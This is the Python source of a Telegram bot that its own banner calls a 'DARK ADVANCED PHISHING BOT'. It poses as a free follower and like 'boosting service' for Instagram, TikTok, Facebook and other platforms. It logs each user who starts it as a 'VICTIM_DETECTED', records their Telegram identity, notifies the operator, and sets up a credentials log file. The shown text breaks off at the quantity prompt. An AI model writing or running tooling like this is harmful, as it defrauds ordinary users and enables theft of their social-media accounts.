import telebot
from telebot import types
import time
import os
import sys
import json
import requests
import socket
import platform
import uuid
from datetime import datetime

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
END = '\033[0m'

print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")
print(f"{RED}{BOLD}DARK 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗣𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗕𝗢𝗧{END}")
print(f"{MAGENTA}{BOLD}" + "="*60 + f"{END}")

print(f"\n{CYAN}{'━'*50}{END}")
ADMIN_ID = input(f"{GREEN}𝗘𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗜𝗗: {YELLOW}").strip()
print(f"{CYAN}{'━'*50}{END}")

print(f"\n{CYAN}{'━'*50}{END}")
BOT_TOKEN = input(f"{GREEN}𝗘𝗻𝘁𝗲𝗿 𝗯𝗼𝘁 𝘁𝗼𝗸𝗲𝗻: {YELLOW}").strip()
print(f"{CYAN}{'━'*50}{END}")


bot = telebot.TeleBot(BOT_TOKEN)


user_sessions = {}
credentials_log = f"DARK_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
session_log = f"DARK_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

def get_ip_info():
    """Get IP address and location info"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unknown'

def get_device_info():
    """Get device information"""
    try:
        return {
            'system': platform.system(),
            'release': platform.release(),
            'machine': platform.machine(),
            'processor': platform.processor()
        }
    except:
        return {'system': 'Unknown'}

def generate_session_id():
    """Generate unique session ID"""
    return str(uuid.uuid4())[:8]


def save_victim_log(victim_data):
    """Save victim data to log file"""
    with open(session_log, 'a', encoding='utf-8') as f:
        f.write(json.dumps(victim_data, indent=2, ensure_ascii=False) + "\n" + "="*60 + "\n")

def save_credentials(cred_data):
    """Save credentials to log file"""
    with open(credentials_log, 'a', encoding='utf-8') as f:
        f.write(json.dumps(cred_data, indent=2, ensure_ascii=False) + "\n" + "="*60 + "\n")

def notify_admin(message):
    """Send notification to admin"""
    try:
        bot.send_message(ADMIN_ID, message)
    except:
        pass


@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command"""
    user_id = message.from_user.id
    username = message.from_user.username or "None"
    first_name = message.from_user.first_name or "Unknown"
    
    
    session_id = generate_session_id()
    user_sessions[user_id] = {
        'session_id': session_id,
        'username': username,
        'first_name': first_name,
        'start_time': datetime.now().isoformat(),
        'step': 'started',
        'platform': None  # Platform will be selected by user
    }
    
    
    victim_info = {
        'type': 'VICTIM_DETECTED',
        'session_id': session_id,
        'telegram_id': user_id,
        'telegram_username': f"@{username}",
        'name': first_name,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': get_ip_info(),
        'device_info': get_device_info()
    }
    
    
    save_victim_log(victim_info)
    
    admin_message = f"""
{RED}{BOLD}🔴 𝗩𝗜𝗖𝗧𝗜𝗠 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗!{END}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
{YELLOW}𝗦𝗲𝘀𝘀𝗶𝗼𝗻:{END} {session_id}
{YELLOW}𝗨𝘀𝗲𝗿:{END} @{username}
{YELLOW}𝗡𝗮𝗺𝗲:{END} {first_name}
{YELLOW}𝗜𝗗:{END} {user_id}
{YELLOW}𝗜𝗣:{END} {victim_info['ip_address']}
{YELLOW}𝗧𝗶𝗺𝗲:{END} {victim_info['timestamp']}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━{END}
"""
    print(admin_message)
    notify_admin(admin_message)
    
   
    welcome_text = """
✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 DARK  𝗕𝗼𝗼𝘀𝘁𝗶𝗻𝗴 𝗦𝗲𝗿𝘃𝗶𝗰𝗲! ✨

𝗚𝗲𝘁 𝗳𝗿𝗲𝗲 𝗯𝗼𝗼𝘀𝘁 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝘀𝗼𝗰𝗶𝗮𝗹 𝗺𝗲𝗱𝗶𝗮 𝗮𝗰𝗰𝗼𝘂𝗻𝘁𝘀:

💰 𝟭𝟬𝟬% 𝗙𝗥𝗘𝗘 𝗦𝗘𝗥𝗩𝗜𝗖𝗘
⚡ 𝗜𝗻𝘀𝘁𝗮𝗻𝘁 𝗿𝗲𝘀𝘂𝗹𝘁𝘀
🔒 𝗦𝗲𝗰𝘂𝗿𝗲 & 𝗦𝗮𝗳𝗲

𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝘁𝗳𝗼𝗿𝗺:
"""
    
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        types.InlineKeyboardButton("📷 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺", callback_data="platform_instagram"),
        types.InlineKeyboardButton("🔵 𝗩𝗞", callback_data="platform_vk"),
        types.InlineKeyboardButton("🎵 𝗧𝗶𝗸𝗧𝗼𝗸", callback_data="platform_tiktok"),
        types.InlineKeyboardButton("📘 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸", callback_data="platform_facebook"),
        types.InlineKeyboardButton("🐦 𝗧𝘄𝗶𝘁𝘁𝗲𝗿", callback_data="platform_twitter"),
        types.InlineKeyboardButton("👻 𝗦𝗻𝗮𝗽𝗰𝗵𝗮𝘁", callback_data="platform_snapchat")
    ]
    
    
    for i in range(0, len(buttons), 2):
        if i+1 < len(buttons):
            keyboard.add(buttons[i], buttons[i+1])
        else:
            keyboard.add(buttons[i])
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def handle_button_click(call):
    """Handle button clicks"""
    user_id = call.from_user.id
    
    if user_id not in user_sessions:
        bot.answer_callback_query(call.id, "Session expired. Send /start again.")
        return
    
    
    if call.data.startswith("platform_"):
        platform_selected = call.data.replace("platform_", "")
        
        
        platform_names = {
            "instagram": "Instagram",
            "vk": "VK",
            "tiktok": "TikTok",
            "facebook": "Facebook",
            "twitter": "Twitter",
            "snapchat": "Snapchat"
        }
        
        platform_name = platform_names.get(platform_selected, "Instagram")
        
       
        user_sessions[user_id]['platform'] = platform_name
        user_sessions[user_id]['step'] = 'platform_selected'
        
        
        notify_admin(f"🔵 Platform selected by @{user_sessions[user_id]['username']}: {platform_name}")
        
        
        show_service_options(call.message, platform_name)
        
    
    elif call.data.startswith("service_"):
        if user_sessions[user_id]['step'] != 'platform_selected':
            bot.answer_callback_query(call.id, "Please select platform first.")
            return
        
        service = call.data.replace("service_", "")
        
        
        user_sessions[user_id]['service'] = service
        user_sessions[user_id]['step'] = 'service_selected'
        
        
        msg = bot.send_message(call.message.chat.id, f"📊 𝗛𝗼𝘄 𝗺𝗮𝗻𝘆 {service.replace('_', ' ')} 𝗱𝗼 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁?\n(𝗠𝗮𝘅: 𝟭𝟬,𝟬𝟬𝟬)")
        bot.register_next_step_handler(msg, ask_quantity)

def show_service_options(message, platform_name):
    """Show service options for selected platform"""
    
    service_text = f"""
✅ 𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱: {platform_name}

𝗡𝗼𝘄 𝘀𝗲𝗹𝗲𝗰𝘁 𝘄𝗵𝗮𝘁 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗯𝗼𝗼𝘀𝘁:
"""
    
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    
    if platform_name == "Instagram":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("👀 𝗦𝘁𝗼𝗿𝘆 𝗩𝗶𝗲𝘄𝘀", callback_data="service_story_views"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments"),
            types.InlineKeyboardButton("📊 𝗜𝗺𝗽𝗿𝗲𝘀𝘀𝗶𝗼𝗻𝘀", callback_data="service_impressions"),
            types.InlineKeyboardButton("🎥 𝗥𝗲𝗲𝗹𝘀 𝗕𝗼𝗼𝘀𝘁", callback_data="service_reels")
        ]
    elif platform_name == "VK":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗿𝗶𝗲𝗻𝗱𝘀", callback_data="service_friends"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("🔄 𝗥𝗲𝗽𝗼𝘀𝘁𝘀", callback_data="service_reposts"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("🎵 𝗠𝘂𝘀𝗶𝗰 𝗟𝗶𝘀𝘁𝗲𝗻𝘀", callback_data="service_music"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments")
        ]
    elif platform_name == "TikTok":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("🔄 𝗦𝗵𝗮𝗿𝗲𝘀", callback_data="service_shares"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments"),
            types.InlineKeyboardButton("🔥 𝗧𝗿𝗲𝗻𝗱𝗶𝗻𝗴", callback_data="service_trending")
        ]
    elif platform_name == "Facebook":
        buttons = [
            types.InlineKeyboardButton("👥 𝗣𝗮𝗴𝗲 𝗟𝗶𝗸𝗲𝘀", callback_data="service_page_likes"),
            types.InlineKeyboardButton("❤️ 𝗥𝗲𝗮𝗰𝘁𝗶𝗼𝗻𝘀", callback_data="service_reactions"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments"),
            types.InlineKeyboardButton("🔄 𝗦𝗵𝗮𝗿𝗲𝘀", callback_data="service_shares"),
            types.InlineKeyboardButton("📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers")
        ]
    elif platform_name == "Twitter":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("🔄 𝗥𝗲𝘁𝘄𝗲𝗲𝘁𝘀", callback_data="service_retweets"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗥𝗲𝗽𝗹𝗶𝗲𝘀", callback_data="service_replies"),
            types.InlineKeyboardButton("🔥 𝗧𝗿𝗲𝗻𝗱𝗶𝗻𝗴", callback_data="service_trending")
        ]
    elif platform_name == "Snapchat":
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗿𝗶𝗲𝗻𝗱𝘀", callback_data="service_friends"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗦𝗻𝗮𝗽𝘀", callback_data="service_snaps"),
            types.InlineKeyboardButton("📈 𝗦𝗰𝗼𝗿𝗲", callback_data="service_score"),
            types.InlineKeyboardButton("🌟 𝗦𝘁𝗿𝗲𝗮𝗸𝘀", callback_data="service_streaks"),
            types.InlineKeyboardButton("💛 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes")
        ]
    else:
        buttons = [
            types.InlineKeyboardButton("👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀", callback_data="service_followers"),
            types.InlineKeyboardButton("❤️ 𝗟𝗶𝗸𝗲𝘀", callback_data="service_likes"),
            types.InlineKeyboardButton("👀 𝗩𝗶𝗲𝘄𝘀", callback_data="service_views"),
            types.InlineKeyboardButton("💬 𝗖𝗼𝗺𝗺𝗲𝗻𝘁𝘀", callback_data="service_comments")
        ]
    
    
    for i in range(0, len(buttons), 2):
        if i+1 < len(buttons):
            keyboard.add(buttons[i], buttons[i+1])
        else:
            keyboard.add(buttons[i])
    
    bot.send_message(message.chat.id, service_text, reply_markup=keyboard)

def ask_quantity(message):
    """Ask for quantity"""
    user_id = message.from_user.id
    
    if user_id not in user_sessions
